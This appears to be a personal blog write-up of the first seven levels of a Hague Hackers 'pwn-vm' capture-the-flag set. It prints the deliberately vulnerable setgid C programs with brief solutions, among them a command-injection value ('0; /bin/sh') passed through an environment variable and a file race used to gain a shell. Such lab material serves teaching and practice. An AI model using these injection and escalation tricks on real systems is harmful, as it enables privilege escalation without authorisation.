---
layout: post
title: "Hague Hackers pwn-vm"
date: 2024-07-02 +0200
categories: jekyll update
---
![](https://ketho.github.io/data/img/haguehackers.png)

These are the `pwn-vm` challenges from Hague Hackers.

- 11 challenges
- `user: pwn`
- `pass: pwn123`
- `./levelup` to continue to next challenge, requires restarting the ssh session

## level 0
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    int gid = getegid();
    if(argc < 3) {
        puts("USAGE: ./level0 arg1 arg2");
        exit(0);
    }
    if((strncmp(argv[1],"ea5y_chaLL3ng3", 14))||(strncmp(argv[2],"eaSy_p34sy", 10))){
        puts("Try again!");
    }
    else {
        if(getenv("level0")){
            setresgid(gid,gid,gid);
            execve("/bin/bash", 0, 0);
        }
        else {
            puts("Maybe next time..");
        }
    }
    return 0;
}
```
- `export level0=test`
- https://stackoverflow.com/questions/234742/setting-environment-variables-in-linux-using-bash

## level 1
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char command[60];
    int gid = getegid();
    snprintf(command, "/bin/print %s !", getenv("level1"), 60);
    setresgid(gid,gid,gid);
    system(command);
    return 0;
```
- `export level1='0; /bin/sh'`

## level 2
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
int sanitycheck(char * s) {
    if((strchr(s, ';'))||(strchr(s, '&'))||(strchr(s, '|'))||(strchr(s, '<'))||(strchr(s, '>'))){
        puts("Illegal");
        exit(1);
    }
    return 0;
}
int main(int argc, char * argv[]){
    char command[60];
    int gid = getegid();
    if(argc < 2) {
        puts("USAGE: ./level2 arg1");
        exit(0);
    }
    sanitycheck(argv[1]);
    snprintf(command,60, "/usr/bin/choom -n %s", argv[1]);
    printf("Executing command: %s", command);
    setresgid(gid,gid,gid);
    execve("/bin/bash", 0, 0);
    return 0;
}
```
- `./level2 "a"`
- supposed to set value of 0 to a process and launch /bin/sh

## level 3
level3.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char * argv[]){
    FILE* fp;
    char command[64];
    char output[20];
    int gid = getegid();
    if(argc < 3) {
        puts("USAGE: ./level0 arg1 arg2");
        exit(0);
    }
    snprintf(command, 64, "/usr/bin/python3 ./script.py %s %s 2>/dev/null", argv[1], argv[2]);
    fp = popen(command, "r");
    if (fp == NULL) {
        puts("Failed to run command");
        exit(1);
    }
    fgets(output, sizeof(output), fp);
    puts(output);
    if(!strncmp(output, "301", 3)){
        setresgid(gid,gid,gid);
        execve("/bin/bash", 0, 0);
    }
}
```

script.py
```py
import requests
import sys
URL = "http://"+sys.argv[1]+":"+sys.argv[2]
r = requests.get(URL)
print(r.status_code)
```
- `./level3 192.168.56.1 3000`

## level 4
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char * argv[]){
    FILE* fd;
    char out[20];
    int gid = getegid();
    fd = fopen("./level4_x78ezf", "w+");
    if (fd == NULL) {
        puts("Failed to open file");
        exit(1);
    }
    fprintf(fd,"%s","level4_is_fUn");
    fclose(fd);
    sleep(2);
    fd = fopen("./level4_x78ezf", "r");
    fgets(out,20, fd);
    puts(out);
    if(!strncmp(out, "level4_1s_4maZinG", 17)){
        setresgid(gid,gid,gid);
        execve("/bin/bash", 0, 0);
    }
    fclose(fd);
    return 0;
}
```
- run `./level4` first
- in second terminal `echo level4_1s_4maZinG > level4_x78ezf`

## level 5
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>

int main(int argc, char * argv[]){
    FILE* fp;
    char command[64];
    char output[32];
    int gid = getegid();
    if(argc < 2) {
        puts("USAGE: ./level5 arg1");
        exit(0);
    }
    snprintf(command, 64, "/usr/bin/md5sum %s 2>/dev/null", argv[1]);
    fp = popen(command, "r");
    fgets(output, 33, fp);
    puts(output);
    if(!strncmp(output, "e522e97c1e99a41f693aec0fb3c127cb", 32)){
        puts("Great!");
        setresgid(gid,gid,gid);
        execve("/bin/bash", 0, 0);
    }
    return 0;
}
```
- show all md5sums of files in current directory
- `find images -type f -exec md5sum {} +`

## level 6
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>

int main(int argc, char * argv[]){
    int gid = getegid();
    setresgid(gid,gid,gid);
    execve("/home/pwn/level6/whoami", 0, 0);
    return 0;
}
```
